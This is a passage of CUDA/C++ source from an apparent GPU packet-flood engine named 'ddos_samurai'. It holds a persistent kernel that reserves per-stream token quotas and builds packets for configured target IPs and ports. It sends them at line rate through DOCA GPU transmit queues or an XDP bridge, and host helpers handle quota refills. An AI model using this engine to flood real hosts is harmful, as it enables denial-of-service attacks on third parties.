    volatile PersistentRuntimeControl* ctrl,
    volatile PersistentDeviceStreamState* streams,
    const volatile ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1* contract_update_ring,
    volatile uint64_t* contract_ring_head,
    volatile uint64_t* contract_ring_tail,
    volatile ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1* contract_hot_flow_table,
    volatile uint64_t* contract_hot_flow_versions,
    volatile uint64_t* contract_hot_flow_epochs,
    int32_t contract_shard_count,
    int32_t contract_ring_slots_per_shard,
    int32_t contract_hot_flow_capacity,
    int32_t max_streams,
    uint32_t lane) {
  using FlowUpdateEvent = ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1;
  if (!ctrl || !streams || !contract_update_ring || !contract_ring_head || !contract_ring_tail ||
      !contract_hot_flow_table || !contract_hot_flow_versions || !contract_hot_flow_epochs ||
      contract_shard_count <= 0 || contract_ring_slots_per_shard <= 0 || contract_hot_flow_capacity <= 0 ||
      max_streams <= 0) {
    return;
  }
  constexpr unsigned int kPollWarpMask = 0xFFFFFFFFu;
  constexpr uint32_t kPollWarpWidth = 32u;
  __shared__ uint32_t s_contract_flow_ids[32];
  __shared__ uint64_t s_contract_versions[32];
  __shared__ int32_t s_contract_loaded[32];
  // The first warp is the block-local polling scope. Each lane drains one
  // event, while lane 0 remains the single tail publisher for the shard.
  if (threadIdx.x >= static_cast<int>(kPollWarpWidth)) {
    return;
  }
  const int32_t shard = static_cast<int32_t>(blockIdx.x);
  if (shard < 0 || shard >= contract_shard_count) {
    return;
  }
  uint64_t head = 0u;
  uint64_t tail = 0u;
  if (lane == 0u) {
    head = u64_load(contract_ring_head + shard);
    tail = u64_load(contract_ring_tail + shard);
  }
  head = __shfl_sync(kPollWarpMask, head, 0);
  tail = __shfl_sync(kPollWarpMask, tail, 0);
  if (tail >= head) {
    return;
  }

  uint64_t available = head - tail;
  if (available > static_cast<uint64_t>(kPollWarpWidth)) {
    available = static_cast<uint64_t>(kPollWarpWidth);
  }
  const uint32_t drain_count = static_cast<uint32_t>(available);
  const bool lane_active = lane < drain_count;
  const uint64_t lane_tail = tail + static_cast<uint64_t>(lane);
  const uint64_t slot = lane_tail % static_cast<uint64_t>(contract_ring_slots_per_shard);
  const size_t ring_index =
      (static_cast<size_t>(shard) * static_cast<size_t>(contract_ring_slots_per_shard)) +
      static_cast<size_t>(slot);
  const volatile FlowUpdateEvent* entry = contract_update_ring + ring_index;
  FlowUpdateEvent ev{};
  bool loaded = false;
  if (lane_active) {
    for (int attempt = 0; attempt < 4; ++attempt) {
      const uint64_t v1 = u64_load(&entry->version);
      if (v1 == 0u || (v1 & 1ull) != 0ull) {
        break;
      }
      __threadfence_system();
      ev.version = v1;
      ev.epoch = u64_load(&entry->epoch);
      ev.flow_id = entry->flow_id;
      ev.tcp_seq = entry->tcp_seq;
      ev.tcp_ack = entry->tcp_ack;
      ev.src_port = entry->src_port;
      ev.dst_port = entry->dst_port;
      ev.tcp_state = entry->tcp_state;
      ev.proto = entry->proto;
      ev.flags = entry->flags;
      ev.rtt_us = entry->rtt_us;
      ev.dpu_ts_ns = u64_load(&entry->dpu_ts_ns);
      __threadfence_system();
      const uint64_t v2 = u64_load(&entry->version);
      if (v1 == v2 && (v2 & 1ull) == 0ull) {
        loaded = true;
        break;
      }
    }
  }
  const unsigned int loaded_mask = __ballot_sync(kPollWarpMask, loaded);
  s_contract_flow_ids[lane] = ev.flow_id;
  s_contract_versions[lane] = ev.version;
  s_contract_loaded[lane] = loaded ? 1 : 0;
  __syncwarp(kPollWarpMask);

  bool should_apply = true;
  if (!loaded) {
    should_apply = false;
  } else if (lane > 0u && (loaded_mask & ((1u << lane) - 1u)) != ((1u << lane) - 1u)) {
    should_apply = false;
  } else if (ev.flow_id >= static_cast<uint32_t>(contract_hot_flow_capacity)) {
    should_apply = false;
    u64_add(&ctrl->contract_poll_stale_events, 1u);
  } else {
    for (uint32_t other_lane = lane + 1u; other_lane < drain_count; ++other_lane) {
      const bool other_loaded = s_contract_loaded[other_lane] != 0;
      if (!other_loaded) {
        continue;
      }
      const uint32_t other_flow = s_contract_flow_ids[other_lane];
      const uint64_t other_version = s_contract_versions[other_lane];
      if (other_flow == ev.flow_id && other_version >= ev.version) {
        should_apply = false;
        break;
      }
    }
    const uint64_t current_version = u64_load(contract_hot_flow_versions + ev.flow_id);
    const uint64_t current_epoch = u64_load(contract_hot_flow_epochs + ev.flow_id);
    if (current_version != 0u && ev.version < current_version) {
      should_apply = false;
      u64_add(&ctrl->contract_poll_stale_events, 1u);
    }
    if (current_epoch != 0u && ev.epoch < current_epoch) {
      should_apply = false;
      u64_add(&ctrl->contract_poll_epoch_mismatch, 1u);
    }
  }

  if (should_apply) {
    volatile FlowUpdateEvent* hot = contract_hot_flow_table + ev.flow_id;
    hot->version = ev.version;
    hot->epoch = ev.epoch;
    hot->flow_id = ev.flow_id;
    hot->tcp_seq = ev.tcp_seq;
    hot->tcp_ack = ev.tcp_ack;
    hot->src_port = ev.src_port;
    hot->dst_port = ev.dst_port;
    hot->tcp_state = ev.tcp_state;
    hot->proto = ev.proto;
    hot->flags = ev.flags;
    hot->rtt_us = ev.rtt_us;
    hot->dpu_ts_ns = ev.dpu_ts_ns;
    contract_hot_flow_versions[ev.flow_id] = ev.version;
    contract_hot_flow_epochs[ev.flow_id] = ev.epoch;

    if (ev.flow_id < static_cast<uint32_t>(max_streams)) {
      volatile PersistentDeviceStreamState* sv = streams + ev.flow_id;
      if (i32_load(&sv->active) != 0) {
        if (ev.src_port != 0u) {
          sv->source_port = ev.src_port;
          sv->source_port_mode = 1u;
        }
        if (ev.flags != 0u) {
          sv->tcp_flags = ev.flags;
        }
        sv->seq_counter = ev.tcp_seq;
      } else {
        u64_add(&ctrl->contract_poll_inactive_flow, 1u);
      }
    }
    u64_add(&ctrl->contract_poll_events, 1u);
  }

  __threadfence_system();
  __syncwarp(kPollWarpMask);
  if (lane == 0u) {
    uint32_t contiguous_loaded = 0u;
    while (contiguous_loaded < drain_count && ((loaded_mask >> contiguous_loaded) & 1u) != 0u) {
      contiguous_loaded += 1u;
    }
    if (contiguous_loaded > 0u) {
      contract_ring_tail[shard] = tail + static_cast<uint64_t>(contiguous_loaded);
    }
  }
}

__global__ void persistent_dataplane_kernel(
    volatile int32_t* run_flag_dev,
    volatile PersistentRuntimeControl* ctrl,
    volatile PersistentDeviceStreamState* streams,
    const volatile PersistentStreamHotState* streams_hot,
    PersistentRingSlot* rings,
    int32_t* queue_slot_hint,
    uint8_t* payload_base,
    const uint64_t* doca_gpu_txq_handles,
    const uint32_t* doca_txq_mkeys_be,
    const volatile ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1* contract_update_ring,
    volatile uint64_t* contract_ring_head,
    volatile uint64_t* contract_ring_tail,
    volatile ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1* contract_hot_flow_table,
    volatile uint64_t* contract_hot_flow_versions,
    volatile uint64_t* contract_hot_flow_epochs,
    int32_t contract_shard_count,
    int32_t contract_ring_slots_per_shard,
    int32_t contract_hot_flow_capacity) {
  const uint32_t tid = static_cast<uint32_t>(blockIdx.x * blockDim.x + threadIdx.x);
  const uint32_t workers = static_cast<uint32_t>(gridDim.x * blockDim.x);
  constexpr uint32_t kWarpWidth = 32u;
  constexpr unsigned int kFullWarpMask = 0xFFFFFFFFu;
  constexpr uint32_t kTokenReserveChunkPerLane = 4u;
  constexpr uint32_t kTokenReserveChunkWarp = kTokenReserveChunkPerLane * kWarpWidth;
  const uint32_t lane = tid & (kWarpWidth - 1u);
  const uint32_t warp_id = tid / kWarpWidth;
  const uint32_t warp_workers = (workers + (kWarpWidth - 1u)) / kWarpWidth;
  uint32_t rr = warp_id;
  uint32_t throttle_gate = tid;
  const PersistentKernelStaticConfig cfg = g_persistent_kernel_static_cfg;
  if (!ctrl || !run_flag_dev || !streams_hot || cfg.queue_count <= 0 || cfg.ring_slots <= 0 || cfg.max_streams <= 0) {
    return;
  }
  const int queue_count = cfg.queue_count;
  const int ring_slots = cfg.ring_slots;
  const int max_streams = cfg.max_streams;
  const int queue_probe_span_default = cfg.queue_probe_span;
  const int max_packet_bytes = cfg.max_packet_bytes;
  const uint32_t queue_count_u = static_cast<uint32_t>(queue_count);
  const uint32_t ring_slots_u = static_cast<uint32_t>(ring_slots);
  const bool queue_pow2 = (queue_count_u & (queue_count_u - 1u)) == 0u;
  const bool ring_pow2 = (ring_slots_u & (ring_slots_u - 1u)) == 0u;
  const uint32_t queue_mask = queue_pow2 ? (queue_count_u - 1u) : 0u;
  const uint32_t ring_mask = ring_pow2 ? (ring_slots_u - 1u) : 0u;
  __shared__ unsigned long long s_queue_pressure;
  __shared__ unsigned long long s_ring_drop_events;
  __shared__ unsigned long long s_queue_spread_events;
  __shared__ unsigned long long s_quota_stall;
  __shared__ unsigned long long s_idle_gap;
  while (*run_flag_dev == 1) {

    uint64_t local_queue_pressure = 0u;
    uint64_t local_ring_drop_events = 0u;
    uint64_t local_queue_spread_events = 0u;
    uint64_t local_quota_stall = 0u;
    uint64_t local_idle_gap = 0u;
    if (threadIdx.x == 0) {
      s_queue_pressure = 0u;
      s_ring_drop_events = 0u;
      s_queue_spread_events = 0u;
      s_quota_stall = 0u;
      s_idle_gap = 0u;
    }
    __syncthreads();

    if (tid == 0u) {
      u64_add(&ctrl->heartbeat, 1u);
    }
    persistent_contract_poll_assigned_shard(
        ctrl,
        streams,
        contract_update_ring,
        contract_ring_head,
        contract_ring_tail,
        contract_hot_flow_table,
        contract_hot_flow_versions,
        contract_hot_flow_epochs,
        contract_shard_count,
        contract_ring_slots_per_shard,
        contract_hot_flow_capacity,
        max_streams,
        lane);
    bool produced = false;
    int active_streams = i32_load(&ctrl->active_streams);
    if (active_streams < 1) {
      active_streams = 1;
    } else if (active_streams > max_streams) {
      active_streams = max_streams;
    }
    int scan_limit = active_streams + static_cast<int>(warp_workers);
    if (scan_limit < 32) {
      scan_limit = 32;
    } else if (scan_limit > max_streams) {
      scan_limit = max_streams;
    }
    const uint32_t max_streams_u = static_cast<uint32_t>(max_streams);
    for (int i = 0; i < scan_limit; ++i) {
      __syncwarp(kFullWarpMask);
      const int idx = static_cast<int>((rr + static_cast<uint32_t>(i)) % max_streams_u);
      volatile PersistentDeviceStreamState* sv = &streams[idx];
      const volatile PersistentStreamHotState* hotv = &streams_hot[idx];
      const unsigned int warp_mask = kFullWarpMask;
      int32_t proto = 0;
      int active = 0;
      uint32_t target_ip = 0u;
      int target_port = 0;
      if (lane == 0u) {
        proto = i32_load(&hotv->protocol);
        active = i32_load(&hotv->active);
        target_ip = u32_load(&hotv->target_ip);
        target_port = static_cast<int>(hotv->target_port);
      }
      proto = __shfl_sync(warp_mask, proto, 0);
      active = __shfl_sync(warp_mask, active, 0);
      target_ip = __shfl_sync(warp_mask, target_ip, 0);
      target_port = __shfl_sync(warp_mask, target_port, 0);
      if (active == 0 || target_ip == 0u || (proto != 1 && target_port == 0)) {
        continue;
      }

      uint32_t slot_seq_base = 0u;
      uint32_t reserved_tokens = 0u;
      if (lane == 0u) {
        reserved_tokens = reserve_stream_tokens(sv, kTokenReserveChunkWarp, &slot_seq_base);
      }
      reserved_tokens = __shfl_sync(warp_mask, reserved_tokens, 0);
      slot_seq_base = __shfl_sync(warp_mask, slot_seq_base, 0);
      if (reserved_tokens == 0u) {
        continue;
      }

      int affinity_q = 0;
      int sid = 0;
      if (lane == 0u) {
        affinity_q = i32_load(&hotv->queue_affinity);
        sid = i32_load(&hotv->stream_id);
      }
      affinity_q = __shfl_sync(warp_mask, affinity_q, 0);
      sid = __shfl_sync(warp_mask, sid, 0);
      uint32_t packet_seq_base = 0u;
      if (lane == 0u) {
        packet_seq_base = atomicAdd(
            (unsigned int*)&sv->seq_counter,
            reserved_tokens);
      }
      packet_seq_base = __shfl_sync(warp_mask, packet_seq_base, 0);
      int produced_for_stream_lane = 0;
      int direct_sent_for_stream_lane = 0;
      int direct_released_for_stream_lane = 0;
      int direct_enqueued_for_stream_lane = 0;
      int direct_packet_qids[kTokenReserveChunkPerLane];
      int direct_packet_count = 0;
      PersistentRingSlot* publish_slots[kTokenReserveChunkPerLane];
      int publish_count = 0;
      #pragma unroll
      for (int pi = 0; pi < static_cast<int>(kTokenReserveChunkPerLane); ++pi) {
        direct_packet_qids[pi] = -1;
        publish_slots[pi] = nullptr;
      }

      for (uint32_t token_i = lane; token_i < reserved_tokens; token_i += kWarpWidth) {
        const uint32_t packet_seq = packet_seq_base + token_i + 1u;
        const uint32_t route_seed = packet_seq ^ (tid * 2654435761u) ^ static_cast<uint32_t>(sid);
        int q_base = affinity_q;
        if (q_base < 0 || q_base >= queue_count) {
          q_base = queue_pow2
              ? static_cast<int>(route_seed & queue_mask)
              : static_cast<int>(route_seed % queue_count_u);
        }
        int probe_span = 1;
        if (queue_count > 1) {
          probe_span = queue_probe_span_default;
          if (probe_span < 1) {
            probe_span = 1;
          }
          if (probe_span > queue_count) {
            probe_span = queue_count;
          }
        }

        PersistentRingSlot* slot_ptr = nullptr;
        int q = q_base;
        uint32_t slot_idx = 0u;
        const uint32_t slot_seq = slot_seq_base + token_i;
        const uint32_t slot_hash = slot_seq ^ (route_seed * 2246822519u);
        const uint32_t slot_probe_stride = ((route_seed >> 5u) | 1u);
        for (int probe = 0; probe < probe_span; ++probe) {
          int q_try = q_base + probe;
          if (q_try >= queue_count) {
            q_try = queue_pow2
                ? static_cast<int>(static_cast<uint32_t>(q_try) & queue_mask)
                : (q_try % queue_count);
          }
          uint32_t hint = 0u;
          if (queue_slot_hint) {
            const int32_t raw_hint = i32_load(&queue_slot_hint[q_try]);
            if (raw_hint > 0) {
              hint = static_cast<uint32_t>(raw_hint);
            }
          }
          uint32_t slot_try = slot_hash + hint + (static_cast<uint32_t>(probe) * slot_probe_stride);
          if (ring_pow2) {
            slot_try &= ring_mask;
          } else {
            slot_try %= ring_slots_u;
          }
          PersistentRingSlot& candidate = rings[q_try * ring_slots + static_cast<int>(slot_try)];
          if (candidate.state != 0) {
            continue;
          }
          if (atomicCAS((int*)&candidate.state, 0, 2) == 0) {
            q = q_try;
            slot_idx = slot_try;
            slot_ptr = &candidate;
            if (queue_slot_hint) {
              const uint32_t next_hint = ring_pow2
                  ? ((slot_try + 1u) & ring_mask)
                  : ((slot_try + 1u) % ring_slots_u);
              (void)atomicExch(&queue_slot_hint[q_try], static_cast<int32_t>(next_hint));
            }
            if (probe > 0) {
              local_queue_spread_events += 1u;
            }
            break;
          }
        }
        if (!slot_ptr) {
          local_queue_pressure += 1u;
          local_ring_drop_events += 1u;
          // Preserve previous semantics: return only quota token on ring miss.
          (void)atomicAdd((unsigned int*)&sv->quota_left, 1u);
          if ((throttle_gate++ & 0x3Fu) == 0u) {
            adaptive_quota_throttle(sv);
          }
          continue;
        }
        PersistentRingSlot& slot = *slot_ptr;

        uint8_t* slot_payload =
            payload_base +
            ((static_cast<size_t>(q) * static_cast<size_t>(ring_slots) + static_cast<size_t>(slot_idx)) *
             static_cast<size_t>(kPersistentUmemFrameSize)) +
            static_cast<size_t>(kPersistentUmemHeadroom);

        persistent_write_packet(
            &slot,
            slot_payload,
            sv,
            packet_seq,
            static_cast<uint32_t>(
                max_packet_bytes > 0
                    ? max_packet_bytes
                    : (kPersistentUmemFrameSize - kPersistentUmemHeadroom)));
        slot.stream_id = sid;
        slot.stream_slot = idx;
        slot.protocol = proto;
        const uint32_t slot_len_u = static_cast<uint32_t>(slot.len > 0 ? slot.len : 0);
        if (slot_len_u > 0u && doca_gpu_txq_handles && doca_txq_mkeys_be && q >= 0 && q < queue_count) {
          const uint64_t gpu_txq_handle = doca_gpu_txq_handles[static_cast<size_t>(q)];
          const uint32_t mkey_be = doca_txq_mkeys_be[static_cast<size_t>(q)];
          if (persistent_doca_kernel_try_enqueue(gpu_txq_handle, mkey_be, slot_payload, slot_len_u)) {
            slot.state = 0;
            slot.len = 0;
            slot.stream_id = 0;
            slot.stream_slot = -1;
            slot.protocol = 0;
            slot.tx_timestamp_ns = 0u;
            if (direct_packet_count < static_cast<int>(kTokenReserveChunkPerLane)) {
              direct_packet_qids[direct_packet_count] = q;
              direct_packet_count += 1;
            }
            direct_enqueued_for_stream_lane += 1;
            produced = true;
            produced_for_stream_lane += 1;
            continue;
          }
        }
        if (doca_gpu_txq_handles && doca_txq_mkeys_be) {
          // Direct-DOCA mode is fail-fast: no host fallback in this path.
          slot.state = 0;
          slot.len = 0;
          slot.stream_id = 0;
          slot.stream_slot = -1;
          slot.protocol = 0;
          slot.tx_timestamp_ns = 0u;
          if (lane == 0u) {
            u64_add(&ctrl->native_batch_degrade_events, 1u);
            ctrl->run = 0;
            atomicExch((int*)run_flag_dev, 0);
          }
          return;
        }
        if (publish_count < static_cast<int>(kTokenReserveChunkPerLane)) {
          publish_slots[publish_count++] = &slot;
        } else {
          persistent_publish_slot_ready(&slot);
        }
        produced = true;
        produced_for_stream_lane += 1;
      }
      #pragma unroll
      for (int pi = 0; pi < static_cast<int>(kTokenReserveChunkPerLane); ++pi) {
        if (publish_slots[pi]) {
          persistent_publish_slot_ready(publish_slots[pi]);
        }
      }
      if (doca_gpu_txq_handles && doca_txq_mkeys_be && direct_packet_count > 0) {
        for (int qid = 0; qid < queue_count; ++qid) {
          int local_qcount = 0;
          #pragma unroll
          for (int pi = 0; pi < static_cast<int>(kTokenReserveChunkPerLane); ++pi) {
            if (pi < direct_packet_count && direct_packet_qids[pi] == qid) {
              local_qcount += 1;
            }
          }
          int warp_qcount = local_qcount;
          for (uint32_t offset = (kWarpWidth >> 1u); offset > 0u; offset >>= 1u) {
            warp_qcount += __shfl_down_sync(warp_mask, warp_qcount, static_cast<int>(offset));
          }
          int commit_failed = 0;
          if (lane == 0u && warp_qcount > 0) {
            const uint64_t gpu_txq_handle = doca_gpu_txq_handles[static_cast<size_t>(qid)];
            if (!persistent_doca_kernel_try_commit_push(gpu_txq_handle)) {
              commit_failed = 1;
            }
          }
          commit_failed = __shfl_sync(warp_mask, commit_failed, 0);
          if (commit_failed != 0) {
            if (lane == 0u) {
              u64_add(&ctrl->native_batch_degrade_events, 1u);
              ctrl->run = 0;
              atomicExch((int*)run_flag_dev, 0);
            }
            return;
          }
        }
        direct_sent_for_stream_lane += direct_enqueued_for_stream_lane;
        direct_released_for_stream_lane += direct_enqueued_for_stream_lane;
      }

      int produced_for_stream = produced_for_stream_lane;
      int direct_sent_for_stream = direct_sent_for_stream_lane;
      int direct_released_for_stream = direct_released_for_stream_lane;
      for (uint32_t offset = (kWarpWidth >> 1u); offset > 0u; offset >>= 1u) {
        produced_for_stream += __shfl_down_sync(warp_mask, produced_for_stream, static_cast<int>(offset));
        direct_sent_for_stream += __shfl_down_sync(warp_mask, direct_sent_for_stream, static_cast<int>(offset));
        direct_released_for_stream +=
            __shfl_down_sync(warp_mask, direct_released_for_stream, static_cast<int>(offset));
      }

      if (lane == 0u && produced_for_stream > 0) {
        (void)atomicAdd((unsigned int*)&sv->produced, static_cast<uint32_t>(produced_for_stream));
        u64_add(&ctrl->produced, static_cast<uint64_t>(produced_for_stream));
        if (direct_sent_for_stream > 0) {
          const uint64_t sent_u = static_cast<uint64_t>(direct_sent_for_stream);
          u64_add(&ctrl->tx_bridge_sent, sent_u);
          u64_add(&ctrl->bridge_drain_packets, sent_u);
          u64_add(&ctrl->bridge_drain_batches, 1u);
        }
        if (direct_released_for_stream > 0) {
          const uint32_t released_u = static_cast<uint32_t>(direct_released_for_stream);
          (void)atomicAdd((unsigned int*)&sv->completed, released_u);
          u64_add(&ctrl->ring_released, static_cast<uint64_t>(released_u));
        }
      }

      if (__any_sync(warp_mask, produced_for_stream_lane > 0)) {
        produced = true;
        if (lane == 0u) {
          rr = static_cast<uint32_t>(idx + 1);
        }
        rr = __shfl_sync(warp_mask, rr, 0);
        break;
      }
    }
    if (!produced) {
      local_quota_stall += 1u;
      local_idle_gap += 1u;
      // Intentional: no GPU-side nanosleep. Idle pacing is controlled by CPU epoch/quota refill.
      if (lane == 0u) {
        if (warp_workers > 1u) {
          rr += warp_workers;
        } else {
          rr += 1u;
        }
      }
      rr = __shfl_sync(kFullWarpMask, rr, 0);
    } else if (warp_workers > 1u) {
      if (lane == 0u) {
        rr += warp_workers;
      }
      rr = __shfl_sync(kFullWarpMask, rr, 0);
    }

    uint64_t warp_queue_pressure = local_queue_pressure;
    uint64_t warp_ring_drop_events = local_ring_drop_events;
    uint64_t warp_queue_spread_events = local_queue_spread_events;
    uint64_t warp_quota_stall = local_quota_stall;
    uint64_t warp_idle_gap = local_idle_gap;
    for (uint32_t offset = (kWarpWidth >> 1u); offset > 0u; offset >>= 1u) {
      warp_queue_pressure += __shfl_down_sync(kFullWarpMask, warp_queue_pressure, static_cast<int>(offset));
      warp_ring_drop_events += __shfl_down_sync(kFullWarpMask, warp_ring_drop_events, static_cast<int>(offset));
      warp_queue_spread_events += __shfl_down_sync(kFullWarpMask, warp_queue_spread_events, static_cast<int>(offset));
      warp_quota_stall += __shfl_down_sync(kFullWarpMask, warp_quota_stall, static_cast<int>(offset));
      warp_idle_gap += __shfl_down_sync(kFullWarpMask, warp_idle_gap, static_cast<int>(offset));
    }
    if (lane == 0u) {
      if (warp_queue_pressure > 0u) {
        atomicAdd(&s_queue_pressure, static_cast<unsigned long long>(warp_queue_pressure));
      }
      if (warp_ring_drop_events > 0u) {
        atomicAdd(&s_ring_drop_events, static_cast<unsigned long long>(warp_ring_drop_events));
      }
      if (warp_queue_spread_events > 0u) {
        atomicAdd(&s_queue_spread_events, static_cast<unsigned long long>(warp_queue_spread_events));
      }
      if (warp_quota_stall > 0u) {
        atomicAdd(&s_quota_stall, static_cast<unsigned long long>(warp_quota_stall));
      }
      if (warp_idle_gap > 0u) {
        atomicAdd(&s_idle_gap, static_cast<unsigned long long>(warp_idle_gap));
      }
    }
    __syncthreads();
    if (threadIdx.x == 0) {
      if (s_queue_pressure > 0u) {
        u64_add(&ctrl->queue_pressure, static_cast<uint64_t>(s_queue_pressure));
      }
      if (s_ring_drop_events > 0u) {
        u64_add(&ctrl->ring_drop_events, static_cast<uint64_t>(s_ring_drop_events));
      }
      if (s_queue_spread_events > 0u) {
        u64_add(&ctrl->queue_spread_events, static_cast<uint64_t>(s_queue_spread_events));
      }
      if (s_quota_stall > 0u) {
        u64_add(&ctrl->quota_stall, static_cast<uint64_t>(s_quota_stall));
      }
      if (s_idle_gap > 0u) {
        u64_add(&ctrl->idle_gap, static_cast<uint64_t>(s_idle_gap));
      }
    }
    __syncthreads();
  }
}

inline void persistent_quota_refill_graph_destroy(PersistentRuntime& rt) {
  rt.quota_refill_graph_enabled = false;
  if (rt.quota_refill_graph_exec) {
    (void)cudaGraphExecDestroy(rt.quota_refill_graph_exec);
    rt.quota_refill_graph_exec = nullptr;
  }
  if (rt.quota_refill_graph) {
    (void)cudaGraphDestroy(rt.quota_refill_graph);
    rt.quota_refill_graph = nullptr;
  }
}

inline bool persistent_quota_refill_graph_prepare(PersistentRuntime& rt) {
  if (!rt.streams_dev) {
    return false;
  }
  if (!rt.quota_refill_stream) {
    if (cudaStreamCreateWithFlags(&rt.quota_refill_stream, cudaStreamNonBlocking) != cudaSuccess) {
      return false;
    }
  }
  persistent_quota_refill_graph_destroy(rt);
  if (cudaStreamBeginCapture(rt.quota_refill_stream, cudaStreamCaptureModeGlobal) != cudaSuccess) {
    return false;
  }
  const int threads = 128;
  const int blocks = std::max(1, (kPersistentMaxStreams + threads - 1) / threads);
  CUDA_KERNEL_LAUNCH(
      persistent_quota_refill_kernel,
      blocks,
      threads,
      rt.quota_refill_stream,
      rt.streams_dev,
      kPersistentMaxStreams);
  if (cudaPeekAtLastError() != cudaSuccess) {
    cudaGraph_t captured = nullptr;
    (void)cudaStreamEndCapture(rt.quota_refill_stream, &captured);
    if (captured) {
      (void)cudaGraphDestroy(captured);
    }
    return false;
  }
  if (cudaStreamEndCapture(rt.quota_refill_stream, &rt.quota_refill_graph) != cudaSuccess || !rt.quota_refill_graph) {
    persistent_quota_refill_graph_destroy(rt);
    return false;
  }
  if (cudaGraphInstantiate(&rt.quota_refill_graph_exec, rt.quota_refill_graph, nullptr, nullptr, 0) != cudaSuccess ||
      !rt.quota_refill_graph_exec) {
    persistent_quota_refill_graph_destroy(rt);
    return false;
  }
  rt.quota_refill_graph_enabled = true;
  return true;
}

inline bool persistent_quota_refill_epoch(PersistentRuntime& rt) {
  if (!rt.streams_dev) {
    return false;
  }
  if (rt.quota_refill_graph_enabled && rt.quota_refill_graph_exec && rt.quota_refill_stream) {
    return cudaGraphLaunch(rt.quota_refill_graph_exec, rt.quota_refill_stream) == cudaSuccess;
  }
  if (!rt.quota_refill_stream) {
    if (cudaStreamCreateWithFlags(&rt.quota_refill_stream, cudaStreamNonBlocking) != cudaSuccess) {
      return false;
    }
  }
  const int threads = 128;
  const int blocks = std::max(1, (kPersistentMaxStreams + threads - 1) / threads);
  CUDA_KERNEL_LAUNCH(
      persistent_quota_refill_kernel,
      blocks,
      threads,
      rt.quota_refill_stream,
      rt.streams_dev,
      kPersistentMaxStreams);
  return (cudaPeekAtLastError() == cudaSuccess);
}

inline int ring_occupancy_now(const PersistentRuntime& rt) {
  if (!rt.ctrl) {
    return 0;
  }
  const uint64_t produced = host_u64_load(&rt.ctrl->produced);
  const uint64_t released = host_u64_load(&rt.ctrl->ring_released);
  return static_cast<int>(produced > released ? (produced - released) : 0u);
}

inline bool persistent_sync_queue_ring_window_to_host(
    PersistentRuntime& rt,
    int q,
    uint32_t start_slot,
    uint32_t slot_count) {
  if (!rt.rings_host || !rt.rings_dev || !rt.bridge_copy_stream || q < 0 || q >= rt.queue_count || rt.ring_slots <= 0) {
    return false;
  }
  if (slot_count == 0u) {
    return true;
  }
  const uint32_t ring_slots_u = static_cast<uint32_t>(rt.ring_slots);
  if (start_slot >= ring_slots_u) {
    return false;
  }
  if (slot_count > ring_slots_u) {
    slot_count = ring_slots_u;
  }

  const size_t queue_base = static_cast<size_t>(q) * static_cast<size_t>(rt.ring_slots);
  const uint32_t first_count = std::min(slot_count, ring_slots_u - start_slot);
  const size_t first_bytes = static_cast<size_t>(first_count) * sizeof(PersistentRingSlot);
  if (first_bytes > 0u) {
    if (cudaMemcpyAsync(
            rt.rings_host + queue_base + static_cast<size_t>(start_slot),
            rt.rings_dev + queue_base + static_cast<size_t>(start_slot),
            first_bytes,
            cudaMemcpyDeviceToHost,
            rt.bridge_copy_stream) != cudaSuccess) {
      return false;
    }
  }

  const uint32_t remain = slot_count - first_count;
  if (remain > 0u) {
    const size_t remain_bytes = static_cast<size_t>(remain) * sizeof(PersistentRingSlot);
    if (cudaMemcpyAsync(
            rt.rings_host + queue_base,
            rt.rings_dev + queue_base,
            remain_bytes,
            cudaMemcpyDeviceToHost,
            rt.bridge_copy_stream) != cudaSuccess) {
      return false;
    }
  }

  return true;
}

inline bool persistent_copy_payload_batch_to_host(
    PersistentRuntime& rt,
    int q,
    const uint32_t* slot_ids,
    const uint16_t* lengths,
    size_t count) {
  if (!rt.payload_host || !rt.payload_dev || !rt.bridge_copy_stream || !slot_ids || !lengths ||
      q < 0 || q >= rt.queue_count) {
    return false;
  }
  for (size_t i = 0; i < count; ++i) {
    const uint32_t slot_id = slot_ids[i];
    const uint16_t len = lengths[i];
    if (slot_id >= static_cast<uint32_t>(rt.ring_slots) || len == 0u) {
      continue;
    }
    const size_t base_slot =
        static_cast<size_t>(q) * static_cast<size_t>(rt.ring_slots) + static_cast<size_t>(slot_id);
    uint8_t* dst =
        rt.payload_host + (base_slot * static_cast<size_t>(kPersistentUmemFrameSize)) +
        static_cast<size_t>(kPersistentUmemHeadroom);
    const uint8_t* src =
        rt.payload_dev + (base_slot * static_cast<size_t>(kPersistentUmemFrameSize)) +
        static_cast<size_t>(kPersistentUmemHeadroom);
    if (cudaMemcpyAsync(dst, src, static_cast<size_t>(len), cudaMemcpyDeviceToHost, rt.bridge_copy_stream) !=
        cudaSuccess) {
      return false;
    }
  }
  return true;
}

inline bool persistent_set_device_slot_state(
    PersistentRuntime& rt,
    int q,
    uint32_t slot_id,
    int32_t state) {
  if (!rt.rings_dev || q < 0 || q >= rt.queue_count || slot_id >= static_cast<uint32_t>(rt.ring_slots)) {
    return false;
  }
  PersistentRingSlot* dev_slot =
      rt.rings_dev + (static_cast<size_t>(q) * static_cast<size_t>(rt.ring_slots)) + static_cast<size_t>(slot_id);
  uint8_t* state_ptr = reinterpret_cast<uint8_t*>(dev_slot) + offsetof(PersistentRingSlot, state);
  return cudaMemcpy(state_ptr, &state, sizeof(state), cudaMemcpyHostToDevice) == cudaSuccess;
}

inline bool persistent_bridge_copy_mark(PersistentRuntime& rt) {
  if (!rt.bridge_copy_stream || !rt.bridge_copy_event) {
    return false;
  }
  return cudaEventRecord(rt.bridge_copy_event, rt.bridge_copy_stream) == cudaSuccess;
}

inline bool persistent_bridge_copy_wait(PersistentRuntime& rt) {
  if (!rt.bridge_copy_event) {
    return false;
  }
  return cudaEventSynchronize(rt.bridge_copy_event) == cudaSuccess;
}

inline bool persistent_bridge_copy_fence(PersistentRuntime& rt) {
  if (!persistent_bridge_copy_mark(rt)) {
    return false;
  }
  return persistent_bridge_copy_wait(rt);
}

inline int persistent_reap_xdp_completions(
    PersistentRuntime& rt,
    int q,
    int handle,
    uint32_t* completion_frame_ids,
    size_t completion_capacity,
    uint64_t& local_released) {
  if (!rt.tx_bridge.xdp_api || !rt.tx_bridge.xdp_api->reap_completions || !completion_frame_ids ||
      completion_capacity == 0u) {
    return 0;
  }
  char errbuf[160];
  errbuf[0] = '\0';
  int reaped = rt.tx_bridge.xdp_api->reap_completions(
